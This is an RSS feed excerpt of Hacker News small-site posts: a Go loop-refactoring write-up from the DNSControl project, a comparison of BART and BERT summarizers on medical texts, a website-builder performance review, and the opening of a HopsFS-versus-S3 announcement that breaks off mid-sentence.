run on each PR, no matter who submitted the code.</p>
<p>This makes it easy for others to contribute to the open source project
because it reduces the anxiety over making changes.  Now any
contributor to the project gets the peace of mind that their code
works and doesnâ€™t break other peopleâ€™s code. Previously contributors
would manually run the test on the DNS provider they use. Now the
automated tests run on the 7 most important providers; and more soon!</p>
<p>As the project maintainer it makes my job easier because I spend less
time testing, more time reviewing the code. This is particularly
important because this is an open source project, not my full-time
job.</p>
<p><strong>Ok, enough about thatâ€¦  letâ€™s look at the refactoring!</strong></p>
<h2 id="the-refactor-itself">The refactor itself</h2>
<p>While diagnosing the bug, the code looked like this: (pseudocode)</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>Xran</span> <span>=</span> <span>false</span> <span>;</span> <span>Yran</span> <span>=</span> <span>false</span>
<span>for</span> <span>range</span> <span>{</span>
    <span>if</span> <span>invariant</span> <span>{</span>
        <span>X</span> <span>;</span> <span>Xran</span> <span>=</span> <span>true</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>Y</span> <span>;</span> <span>Yran</span> <span>=</span> <span>true</span>
    <span>}</span>
<span>}</span>
<span>if</span> <span>Xran</span> <span>{</span> <span>Xfollowup</span> <span>}</span>
<span>if</span> <span>Yran</span> <span>{</span> <span>Yfollowup</span> <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This was basically a single loop trying to be two different things.
If invariant was true, it was doing task X, which required follow-up
work (Xfollowup).  If the invariant was false, it was doing task Y,
which required different follow-up work.  It was using <code>Xran</code>/<code>Yran</code>
flags to record which variation of the loop was used so that the
proper follow-up code could be executed.</p>
<p>This was refactored into two separate loops by moving the inner <code>if</code>
to be outside, and repeating the loop code for X and again for Y:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>if</span> <span>invariant</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>X</span>
    <span>}</span>
    <span>Xfollowup</span>
<span>}</span> <span>else</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>Y</span>
    <span>}</span>
    <span>Yfollowup</span>          <span>&lt;&lt;</span><span>&lt;</span> <span>spoiler</span> <span>alert</span><span>:</span> <span>this</span> <span>is</span> <span>the</span> <span>bug</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>The bug was triggered in some tests but not others. By thinking about
what was different about the failing tests I was able to find the
problem: the Yfollowup task needed to be done for every Y, not just at
the end.</p>
<p>In other words, Yfollowup was to be moved up into the <code>for</code> loop.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>if</span> <span>invariant</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>X</span>
    <span>}</span>
    <span>Xfollowup</span>
<span>}</span> <span>else</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>Y</span>
        <span>Yfollowup</span>      <span>&lt;&lt;</span><span>&lt;</span> <span>moved</span> <span>into</span> <span>the</span> <span>loop</span>
    <span>}</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>After the code was refactored it was easy to fix the bug. Prior to the
refactoring I kept adding more flags and conditionals andâ€¦ ugh, it
was getting worse and worse.</p>
<p>Once the code was refactored, I could fix the bug much easier.</p>
<h2 id="the-anti-pattern">The anti-pattern</h2>
<p>We should name this the â€œOne loop trying too hardâ€ anti-pattern.</p>
<p>The complexity was due to a loop being used for two entirely different
purposes.  It was nice to not have to repeat the loop iterator, but it
was making everything else more complex.</p>
<p>This is a common anti-pattern: one loop doing two things for no good
reason.  The code smell is that the <em>entire</em> body of the loop was
contained in a big if/then/else. If there was no common code between
the two invariants, why not have two loops?</p>

<p>You can view the refactoring PR in Github.  The loop is on
around line 300 of
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files#diff-248e265c7bf6f13c2713cf28a1df30cdbdd0900849b7ce5eb81071b8bfbded90R292"><code>providers/route53/route53Provider.go</code></a> in
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files">StackExchange/dnscontrol#938</a>.</p>
<p>If you would like to maintain your DNS zone files in a â€œinfrastructure
as codeâ€ manner, check out <a href="http://dnscontrol.org/">DNSControl</a>.  It now supports <a href="https://stackexchange.github.io/dnscontrol/provider-list">28 DNS providers</a> such as Route53, Google DNS, and Gandi.  It has some interesting features such as the ability to <a href="https://stackexchange.github.io/dnscontrol/spf-optimizer">optimize your SPF records</a>, and use <a href="https://stackexchange.github.io/dnscontrol/code-tricks">macros to assure consistency</a>.
Writing new providers is so easy that many people have written them as
their <a href="https://everythingsysadmin.com/2017/08/go-get-up-to-speed.html">first experience writing
Go</a>!</p>
<p>FunFact: At Stack Overflow we integrated it into our CI/CD system so that devs
can send PRs to request DNS changes, and SREs donâ€™t have to look at
the PR until it passes all our tests (See? More automated testing!).</p>
<hr>
    </div>

    
    


    
    

    
  </article>

  
  

  
  

  

  
  

  

  

  

    

  

        </div>
      </div>
    </div></div>]]>
            </description>
            <link>https://www.yesthatblog.com/post/0085-refactoring-a-loop-that-was-trying-too-hard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149328</guid>
            <pubDate>Thu, 19 Nov 2020 13:44:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Summarize Medical Texts Using Machine Learning]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25149236">thread link</a>) | @myurushkin
<br/>
November 19, 2020 | https://broutonlab.com/blog/summarization-of-medical-texts-machine-learning | <a href="https://web.archive.org/web/*/https://broutonlab.com/blog/summarization-of-medical-texts-machine-learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<h2><strong>What is the summarization task?</strong></h2>
<p>Text summarization is the process of selecting the most crucial information from a text to create its shortened version based on a specific goal. Broadly there are two different approaches used to solve this task automatically:</p>
<ol>
<li>Extractive summarization</li>
<li>Abstractive summarization</li>
</ol>
<h2><strong>Extractive summarization</strong></h2>
<p>The name gives away what this approach does: the final summary consists of only sentences and phrases in the original text. The main goal of extractive summarization algorithms is to identify the importance of sentences and phrases.&nbsp; Then it extracts those that have the highest one.</p>
<p>The diagram below illustrates the essence of extractive summarization.</p>
<p><img alt="Summarization of Medical Texts Machine Learning" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/summarization-of-medical-texts-machine-learning.jpg"></p>
<p><em>Figure 1. The process of extractive summarization</em></p>
<p>Extractive summaries usually present significant issues and semantic parts of the original text. Due to its simplicity, the approach is suitable for texts of any length.</p>
<h2><strong>Abstractive summarization</strong></h2>
<p>This approach is more complicated because it implies generating a new text in contrast to the extractive summarization. In other words, abstractive summarization algorithms use parts of the original text to get its essential information and create shortened versions of the text. They can contain words and phrases that are not in the original. Such algorithms are usually implemented via deep neural networks.</p>
<p>The process of abstractive summarization looks like how people work with information. The principle is illustrated in the diagram below.</p>
<p><img alt="Abstractive Summarization Using Machine Learning " src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/abstractive-summarization-using-machine-learning.jpg"></p>
<p><em>Figure 2. The process of abstractive summarization</em></p>
<h2><strong>Comparison of abstractive and extractive approaches</strong></h2>
<ul>
<li>Abstractive summaries are usually much more coherent and less informative than extractive ones.</li>
<li>Many abstractive summarization models use attention mechanisms, making them unsuitable for long texts. (original <a href="https://arxiv.org/abs/1706.03762">paper</a>).</li>
<li>Extractive summary algorithms are much easier to create. Sometimes even no specific datasets are necessary. In contrast, abstractive ones need a lot of specially marked-up texts.</li>
</ul>
<h2><strong>Models</strong></h2>
<p>Today, there are many different models for summarizing a text in English (you can find more information <a href="https://github.com/sebastianruder/NLP-progress/blob/master/english/summarization.md">here</a>). There is no specific theory to figure out which model works fine for a particular kind of text. It needs experimenting.</p>
<p>We compared abstractive and extractive summarization models when used in scientific medicine texts. The main feature of such texts is that they contain plenty of numbers, graphic objects which provide readers with little information by themselves. Thus, models should â€œunderstandâ€ it and exclude such parts of the text from the final summary.</p>
<p>We considered two models: BART_Summarizer (abstractive summarizer) and BERT_Summarizer (extractive summarizer).</p>
<h2><strong><em>BART_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1910.13461">BART</a> is a model that generalizes the approaches of the <a href="https://arxiv.org/abs/1810.04805">BERT</a> and <a href="https://d4mucfpksywv.cloudfront.net/better-language-models/language-models.pdf">GPT-2</a> models. It uses a bidirectional encoder and an autoregressive decoder. This language model can be applied to a wide range of text generation tasks, including automatic text summarization. The model builds an abstract summary and works efficiently with not very long texts. Currently shows one of the best ROUGE scores on the news dataset Â«CNN/DailyMail.Â»</p>
<p>Since this model text length limit, the text can be divided into several parts, summarized independently. Moreover, short sentences (less than 20 symbols) hurt both abstractive and extractive models' performance quality. Thatâ€™s why during the text preprocessing, parts of these sentences get removed.</p>
<h2><strong><em>BERT_Summarizer</em></strong></h2>
<p><a href="https://arxiv.org/abs/1810.04805">BERT</a> is a language model developed by Google which can extract semantic features from a text. All these features can be transformed into vectors of words, sentences, and whole text. BERT_Summarizer uses BERT for building vectors of sentences and then clustering algorithm K-Means to allocate all sentences into groups with similar semantics. The final summary gets formulated from sentences that are the most closed to cluster centroids. Such an approach enables the selection of representative sentences of most semantic parts from a text.</p>
<p>The idea of clustering is illustrated below.</p>
<p><img alt="Sentence Clusters" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/sentence-clusters.jpg"></p>
<p><em>Figure 3. Sentence clusters</em></p>
<h2><strong><em>Results</em></strong></h2>
<p>We gathered 20 articles from a<a href="http://www.medicinescience.org/"> medical journal</a> and evaluated the models under the supervision of <a href="https://en.wikipedia.org/wiki/ROUGE_(metric)">ROUGE-metrics</a> and manually. The results showed that both models could be applied to summarize medicine texts. Yet, extractive summarizer works with a bit better quality. It turned out that an abstractive summarizer uses the generating approach. It sometimes makes factual mistakes because medical texts have a complicated structure. Additionally, the model has to work with several parts of the original text independently. Also, abstractive summarization takes much more time on long texts and uses a lot of RAM resources. Thatâ€™s why extractive summarization for long medical texts is more preferred.</p>
<p>You can try to use the models yourself. Follow the instructions described in the <a href="https://colab.research.google.com/drive/1WZhF3uwTtoAgy3JtTtrAfu-4CrRJXB2e?usp=sharing">demo</a>, explore, and have fun with it. The example of texts that models worked with is provided there as well.</p>
<h2><strong><em>Examples</em></strong></h2>
<h3>1) Original text:</h3>
<p>American researchers have found out that testing blood can reveal the risk of Alzheimer's disease in later years. If the results are confirmed, it would be real progress towards helping patients suffering from these diseases. In most cases, Alzheimer's disease hits the brain slowly. Patients may go on for several years without knowing it. According to doctors, most drugs do not help because they are given too late.</p>
<p>Today doctors use computer scans to determine if there is damage to the brain. An examination based on blood would be an easy and cheap way to test patients. Although researchers are excited about the new blood-based tests, they say that it will not be available for widespread use within the next five to ten years.</p>
<h3><em>Generated summary:</em></h3>
<p><em>American researchers have found out that testing blood can reveal the risk of Alzheimer's disease in later years. If the results are confirmed, it would be real progress towards helping patients suffering from these diseases. Although researchers are excited about the new blood-based tests, they say that it will not be available for widespread use within the next five to ten years.</em></p>
<h3>2) Original text:</h3>
<p>The WHO reports that Japanese residents who lived near the Fukushima nuclear reactor are at a higher risk of getting cancer. They say that it is unclear how many people got exposed to high radiation levels, but those living in the area had a higher risk of developing cancer in their lifetime. Small children may develop thyroid cancer.</p>
<p>The organization also reports that leukemia, breast cancer may as well go up. The report suggests that females are more likely to develop cancer than males. Besides, about a third of the emergency workers got exposed to radiation after the accident. The World Health Organization emphasizes that there is no health risk to the rest of the Japanese population. However, people living in the Fukushima area should be observed over a longer period.</p>
<h3><em>Generated summary:</em></h3>
<div><p><em>The WHO says it is unclear how many people got exposed to high radiation levels, but those living in the area had a higher risk of developing cancer in their lifetime. The organization also reports that leukemia, breast cancer may also go up. They emphasize that there is no health risk to the rest of the Japanese population.</em></p></div>

			</div></div>]]>
            </description>
            <link>https://broutonlab.com/blog/summarization-of-medical-texts-machine-learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149236</guid>
            <pubDate>Thu, 19 Nov 2020 13:30:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Website Builder Performance Review]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25149211">thread link</a>) | @mostlystatic
<br/>
November 19, 2020 | https://www.debugbear.com/blog/website-builder-performance-review | <a href="https://web.archive.org/web/*/https://www.debugbear.com/blog/website-builder-performance-review">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
  <div>
    <div>
    
      
      

      

      <div>
        
        

        <p>Site builders let you create your own website without writing any code, but the websites they generate aren't always fast. Slow page load times not only affect the experience of your visitors, but <a href="https://www.debugbear.com/docs/metrics/core-web-vitals">can also hurt SEO</a>.</p>
<p>I tested the performance of a similar site built using 14 different website builder tools. This post first presents the overall results and then looks at each website builder in detail.</p>
<ol>
<li><a href="#site-builder-performance-results">Site builder performance results</a></li>
<li><a href="#rendering-performance">Rendering performance</a></li>
<li><a href="#a-look-at-the-performance-of-each-site-builder">A look at the performance of each site builder</a></li>
<li><a href="#takeaways-for-site-builder-developers">Takeaways for site builder developers</a></li>
<li><a href="#more-metrics">More metrics</a></li>
</ol>
<h2 id="site-builder-performance-results">Site builder performance results</h2>
<p>The table below shows the test results for each website builder. It's sorted by the site's Lighthouse score, which gives an overall assessment of the performance of a web page. (This is also the score you would get from PageSpeed Insights.)</p>
<p>The Performance score isn't always the best metric to evaluate website performance. You can click on the column headings in the table to sort the different site builders by a different metric.</p>
<p>While Versoly has the highest Lighthouse score on mobile, Wix has the highest score on a desktop device. Strikingly renders initial content the fastest, but it takes a long time for the page to become interactive.</p>
<div id="WebsiteBuilderReview2020Table" data-reactroot=""><table><thead><tr><th>Site Builder</th><th><span>â–¾</span> <!-- -->Score</th><th><span>â–¾</span> <!-- -->FCP</th><th><span>â–¾</span> <!-- -->SI</th><th><span>â–¾</span> <!-- -->LCP</th><th><span>â–¾</span> <!-- -->TTI</th><th><span>â–¾</span> <!-- -->CPU</th><th><span>â–¾</span> <!-- -->Size</th></tr></thead><tbody><tr><td>Versoly</td><td>80</td><td>2.11 s</td><td>3.43 s</td><td>4.37 s</td><td>4.38 s</td><td>672 ms</td><td>453 KB</td></tr><tr><td>Webflow</td><td>77</td><td>1.74 s</td><td>3.13 s</td><td>4.95 s</td><td>4.96 s</td><td>1.35 s</td><td>671 KB</td></tr><tr><td>Wix</td><td>72</td><td>1.67 s</td><td>2.67 s</td><td>5.24 s</td><td>6.69 s</td><td>3.26 s</td><td>759 KB</td></tr><tr><td>Site123</td><td>67</td><td>2.61 s</td><td>3.21 s</td><td>3.40 s</td><td>5.57 s</td><td>2.30 s</td><td>558 KB</td></tr><tr><td>GoDaddy</td><td>63</td><td>2.30 s</td><td>3.02 s</td><td>3.93 s</td><td>7.02 s</td><td>3.77 s</td><td>783 KB</td></tr><tr><td>Jimdo</td><td>58</td><td>3.62 s</td><td>5.54 s</td><td>5.70 s</td><td>4.34 s</td><td>1.35 s</td><td>517 KB</td></tr><tr><td>Yola</td><td>54</td><td>2.08 s</td><td>4.60 s</td><td>4.62 s</td><td>3.65 s</td><td>3.22 s</td><td>615 KB</td></tr><tr><td>Webnode</td><td>48</td><td>3.75 s</td><td>4.92 s</td><td>9.05 s</td><td>6.26 s</td><td>2.21 s</td><td>855 KB</td></tr><tr><td>Weebly</td><td>39</td><td>3.40 s</td><td>6.74 s</td><td>7.33 s</td><td>7.40 s</td><td>3.74 s</td><td>996 KB</td></tr><tr><td>Wordpress.com</td><td>34</td><td>2.65 s</td><td>4.88 s</td><td>5.54 s</td><td>15.9 s</td><td>9.46 s</td><td>878 KB</td></tr><tr><td>Strikingly</td><td>32</td><td>1.12 s</td><td>4.01 s</td><td>22.5 s</td><td>28.7 s</td><td>10.6 s</td><td>2.32 MB</td></tr><tr><td>SquareSpace</td><td>31</td><td>2.09 s</td><td>8.29 s</td><td>8.79 s</td><td>6.97 s</td><td>3.56 s</td><td>994 KB</td></tr><tr><td>Weblium</td><td>23</td><td>3.68 s</td><td>6.44 s</td><td>6.93 s</td><td>19.0 s</td><td>3.67 s</td><td>1.14 MB</td></tr><tr><td>UCraft</td><td>18</td><td>2.67 s</td><td>10.6 s</td><td>15.6 s</td><td>22.7 s</td><td>10.4 s</td><td>3.29 MB</td></tr></tbody></table></div>
<h3 id="performance-metrics">Performance metrics</h3>
<h4 id="lighthouse-performance-score">Lighthouse Performance Score</h4>
<p>This is an overall assessment of the website's performance, combining 6 different metrics into a score ranging from 0 to 100.</p>
<h4 id="first-contentful-paint-speed-index-si-and-largest-contentful-paint-lcp">First Contentful Paint, Speed Index (SI), and Largest Contentful Paint (LCP)</h4>
<p>The <a href="https://www.debugbear.com/docs/metrics/first-contentful-paint">First Contentful Paint</a> measures when the user first starts seeing page content, such as text or an image.</p>
<p>Speed Index visually measures how quickly the page content reaches its final state.</p>
<p>The <a href="https://www.debugbear.com/docs/metrics/largest-contentful-paint">Largest Contentful Paint</a> measures when the largest element on the page was rendered. Unlike Speed Index, the LCP will increase even if the newly painted element is similar to the previous element content.</p>
<h4 id="tti-time-to-interactive">TTI (Time to Interactive)</h4>
<p>Time to Interactive measures how quickly the page becomes idle, meaning there isn't much ongoing network or CPU activity. This usually means that any interactive elements on the page are ready to be used by the visitor.</p>
<h4 id="cpu-processing-time">CPU Processing Time</h4>
<p>This measures how much time the browser spends on things like running JavaScript code or rendering page content.</p>
<h4 id="page-size">Page Size</h4>
<p>This measures the overall (compressed) download weight of the page.</p>
<h2 id="rendering-performance">Rendering performance</h2>
<p>Minimizing the time it takes for page content to appear after navigating to a page is one of the most important aspects of site performance.</p>
<p>The image shows a side by side view of the rendering timelines of all tested website builders.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/timelines.png" alt="Filmstrips for all tested website builders"></p>
<p>(I added Webflow later, so it's not included in this image.)</p>
<h2 id="a-look-at-the-performance-of-each-site-builder">A look at the performance of each site builder</h2>
<h3 id="versoly">Versoly</h3>
<p>Versoly takes a while to render the image, but doesn't run any additional JavaScript processing once the page has loaded.</p>
<p>A different default background color for the image would make it easier to read the text early on.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly.png" alt=""></p>
<p>There are two render-blocking CSS files, both on different domains. That means the existing server connection can't be re-used. The background image does not start loading until the render-blocking CSS has been finished loading.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/versoly-requests.png" alt=""></p>
<p>Versoly only makes 10 requests overall, which is the lowest request count among all tested site builders.</p>
<h3 id="webflow">Webflow</h3>
<p>Webflow also starts to render quite quickly, but then takes a while to start downloading the image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow.png" alt=""></p>
<p>With a size of just 2KB, the initial page HTML loads very quickly. However, there are two render-blocking CSS and JavaScript requests, both on different domains that require a new server connection.</p>
<p>The hero background image is defined in the render-blocking CSS file, and therefore doesn't start to load until after the CSS file.</p>
<p>At 355KB the background image is also fairly large and takes a while to download. It could be worth first serving a low-resolution version of the image before starting the full download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webflow-requests.png" alt=""></p>
<h3 id="wix">Wix</h3>
<p>Wix quickly renders the general page layout and then loads the image. It looks like the text doesn't show up until a web font is loaded, however this doesn't seem to be the case when testing with a newer version of Chrome.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix.png" alt=""></p>
<p>Compared to Versoly, the Wix site is a lot chunkier with 66 network requests and 2s of JavaScript execution time.</p>
<p>Wix does not have any render-blocking resources apart from the root document, but downloading the 102KB HTML document can take half a second on a slow connection.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wix-requests.png" alt=""></p>
<h3 id="site-123">Site123</h3>
<p>The Site123 page loads fairly quickly, loading two render-blocking CSS files in addition to the document. Once the site has rendered there's isn't much additional work that's done by the CPU.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123.png" alt=""></p>
<p>The background image starts loading immediately after the HTML response has arrived, thanks to a <a href="https://www.debugbear.com/blog/resource-hints-rel-preload-prefetch-preconnect"><code>rel="preload"</code></a> tag.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/site123-requests.png" alt=""></p>
<h3 id="go-daddy">GoDaddy</h3>
<p>The GoDaddy site contains several render-blocking scripts and stylesheets. The background image loads quickly, as GoDaddy first serves a 1.3KB low-resolution image before serving the higher-resolution version.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy.png" alt=""></p>
<p>In total, GoDaddy makes 148 network requests when loading the page. Part of this consists of initializing a service worker, so that the site is available offline after the initial load.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/godaddy-requests.png" alt=""></p>
<h3 id="jimdo">Jimdo</h3>
<p>The initial render for the Jimdo site is quite slow, and it takes over 6s for the image to show up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo.png" alt=""></p>
<p>The cause of this is a chain of render-blocking CSS requests. First, Jimdo loads <code>layout.css</code>, which in turn contains an <code>@import</code> statement fetching a font definition.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/jimdo-requests.png" alt=""></p>
<h3 id="yola">Yola</h3>
<p>The Yola site only has partial server-side rendering, most of the work is done by client-side JavaScript. As a result, the page spends 1s running JavaScript before starting to load the background image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola.png" alt=""></p>
<p>The JavaScript application code, as well as multiple CSS files, also block the initial render for a while.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/yola-requests.png" alt=""></p>
<h3 id="webnode">Webnode</h3>
<p>On the Webnode site, no content is rendered for the first 4s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode.png" alt=""></p>
<p>Again we can see a chain of render-blocking CSS requests. The first Typekit CSS file uses <code>@import</code> to load another CSS file.</p>
<p>Importantly, this CSS file is on a different domain, meaning a new server connection has to be set up. This could be sped up by preconnecting to the <code>p.typekit.net</code> domain.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/webnode-requests.png" alt=""></p>
<h3 id="weebly">Weebly</h3>
<p>Weebly starts rendering after 4s, but text doesn't appear until 5 seconds after opening the page.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly.png" alt=""></p>
<p>This is because the page is waiting to load the web fonts before rendering the text. This delay could be avoided by using the CSS <code>font-display: swap</code> option, which would use a default font until the desired font is available.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weebly-requests.png" alt=""></p>
<h3 id="wordpress-com">Wordpress.com</h3>
<p>The Wordpress.com site starts to render after about 4s and the image loads after 6s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress.png" alt=""></p>
<p>After the initial load it takes a while for the page to become idle. It makes a total of 355 requests, mostly contacting various advertising domains.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/wordpress-requests.png" alt=""></p>
<h3 id="strikingly">Strikingly</h3>
<p>Strikingly inlines all necessary CSS into the initial document request. As a result, there are no render-blocking scripts or stylesheets, and Strikingly has the fastest First Contentful Paint with a value of just 1.1s.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly.png" alt=""></p>
<p>However, the site then continues to download 1.8MB of JavaScript code. All of this needs to load and execute before the page becomes interactive, for example so that visitors can click on the menu icon.</p>
<p>To speed up that process, the bundle size could be reduced and the two scripts could be loaded in parallel.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-requests.png" alt=""></p>
<p>When testing the site with PageSpeed Insights, Lighthouse actually prematurely ends the test before the page finishes loading and becomes interactive. As a result, it reports a Time to Interactive of just 4.5s, and an overall Performance score of 72.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/strikingly-psi.png" alt=""></p>
<h3 id="square-space">SquareSpace</h3>
<p>SquareSpace starts loading reasonably quickly, but it then takes a long time before the background image shows up.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace.png" alt=""></p>
<p>This is because the image is not included in HTML that was rendered on the server, and as a result the browser first needs to download and run 609KB of JavaScript code before starting to load the image.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/squarespace-requests.png" alt=""></p>
<h3 id="weblium">Weblium</h3>
<p>Rendering of the Weblium site is blocked for a while due to various CSS files, including a 172 KB stylesheet with embedded web fonts.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium.png" alt=""></p>
<p>After the initial render, Weblium launches a React app and starts downloading the background image. Later on in the process a 475 KB JavaScript file called <code>legacy.js</code> is loaded and run.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/weblium-requests.png" alt=""></p>
<h3 id="u-craft">UCraft</h3>
<p>The UCraft site starts rendering fairly quickly, but the background image is lazy loaded and depends on JavaScript code to run and trigger the image download.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft.png" alt=""></p>
<p>Once that JavaScript code has run, the page not only downloads the background image but also another 1.16MB that isn't used on the site but appears to be part of the template I used.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/ucraft-requests.png" alt=""></p>
<h3 id="mozello">Mozello</h3>
<p>I tested Mozello as well, but didn't include it in the results because the free plan doesn't support HTTPS. HTTPS is good for security but slightly slows websites down, so it didn't feel like an apples to apples comparison.</p>
<p>Having said that, Mozello's mobile Lighthouse score of 83 was actually the highest overall score. I would expect Mozello sites to be fast even with HTTPS enabled.</p>
<p>With a page weight of 258 KB, Mozello also had the lowest download size. After the initial render there's no further network or CPU activity.</p>
<p><img src="https://www.debugbear.com/public/blog/website-builder-performance/mozello.png" alt=""></p>
<h2 id="methodology">Methodology</h2>
<p>In each website builder, I created a simple site with two components: a heading section with a background image, and a three column text section. I â€¦</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.debugbear.com/blog/website-builder-performance-review">https://www.debugbear.com/blog/website-builder-performance-review</a></em></p>]]>
            </description>
            <link>https://www.debugbear.com/blog/website-builder-performance-review</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149211</guid>
            <pubDate>Thu, 19 Nov 2020 13:26:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HopsFS: 100x Times Faster Than AWS S3]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25149154">thread link</a>) | @nathaliaariza
<br/>
November 19, 2020 | https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3 | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/hopsfs-100x-times-faster-than-aws-s3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><div><p>TLDR; Many developers believe S3 is the "end of file system history". It is impossible to build a file/object storage system on AWS that can compete with S3 on cost. But what if you could build on top of S3 a distributed file system with a HDFS API that gives you POSIX goodness and improved performance? Thatâ€™s what we have done with a cloud-native release of HopsFS that is highly available across availability zones, has the same cost as S3, but has 100X the performance of S3 for file move/rename operations, and 3.4X the read throughput of S3 (EMRFS) for the DFSIO Benchmark (peer reviewed at ACM Middleware 2020).</p></div><figure id="w-node-31b3b43a5a37-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5fb65d314c5b6d0d5e4ae699_p4lO2294TIlBpyTyn36TMK3IC2UgJYIsOShNfA_v4ubinKblLQKOXG8rKcWnKuxoNJVGfRHWH69bEpG-twMaswNrBnv22mhMlGDVnW2SU3s1mRtQ-7BWL9kii4GleyV774hoZCE4.png" alt=""></p><figcaption><strong>HopsFS has lower latency and higher throughput than EMRFS (S3) for metadata operations (</strong><a href="https://www.logicalclocks.com/research/hopsfs-s3-extending-object-stores-with-posix-like-semantics-and-more-industry-track"><strong>Middleware â€˜20</strong></a><strong>).<br></strong></figcaption></figure><h2>The Dumb Bucket</h2><p>S3 has become the de-facto platform for storage in AWS due to its scalability, high availability, and low cost. However, S3 provides weaker guarantees and lower performance compared to distributed hierarchical file systems. Despite this, many developers erroneously believe that S3 is the end of file system history - there is no alternative to S3, so just re-write your applications to account for its limitations (such as slow and inconsistent file listings, non atomic file/dir rename, closed metadata, and limited change data capture (CDC) support). Azure has built an improved file system, <a href="https://docs.microsoft.com/en-us/azure/storage/blobs/data-lake-storage-introduction">Azure Data Lake Storage</a> (ADLS) V2, on top of Azure Blob Storage (ABS) service. ADLS provides a HDFS API to access data stored in a ABS container, giving improved performance and POSIX-like goodness. But, until today, there has been no equivalent to ADLS for S3. Today, we are launching HopsFS as part of <a href="https://www.hopsworks.ai/">Hopsworks</a>.</p><h2>Hierarchical File Systems strike back in the Cloud</h2><p>Hierarchical distributed file systems (like HDFS, CephFS, GlusterFS) were not scalable enough or highly available across availability zones in the cloud, motivating the move to S3 as the scalable storage service of choice. In addition to the technical challenges, AWS have priced virtual machine storage and inter-availability zone network traffic so high that no third party vendor could build a storage system that offers a per-byte storage cost close in price to S3.&nbsp;</p><p>However, the move to S3 has not been without costs. Many applications need 